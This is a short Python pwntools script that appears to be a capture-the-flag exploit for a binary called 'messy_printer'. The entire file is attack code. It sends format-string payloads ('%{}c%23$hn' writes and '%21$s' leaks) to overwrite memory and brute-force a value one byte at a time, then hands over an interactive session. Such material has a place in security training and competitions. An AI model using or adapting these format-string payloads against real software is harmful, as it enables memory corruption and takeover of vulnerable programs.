from pwn import *

def change(offset):
    global r
    r.send('y')
    r.recvuntil('title:')
    r.sendline('%{}c%23$hn'.format(offset))
    r.recvuntil('Give me content:')
    r.sendline('aaa')
    r.recvuntil('[y/n]:')

r = process('messy_printer')
raw_input('debug')
r.recvuntil('[y/n]:')

guessed = '\x7f'

success = 0
for i in range(4):
    change(0x8788 + 4 - i)
    for guess in range(1, 256):
        r.send('y')
        r.recvuntil('title:')
        r.sendline('%21$s')
        title = r.recvuntil('Give me content:').split('Give')[0].strip()
        r.sendline(chr(guess) + guessed)
        content = r.recvuntil('[y/n]:').split('Continue')[0].strip()

        if title == content:
            success += 1
            print('success: {}, {}', success, guessed)
            guessed = chr(guess) + guessed
            break

    if success == 0:
        break

r.interactive()
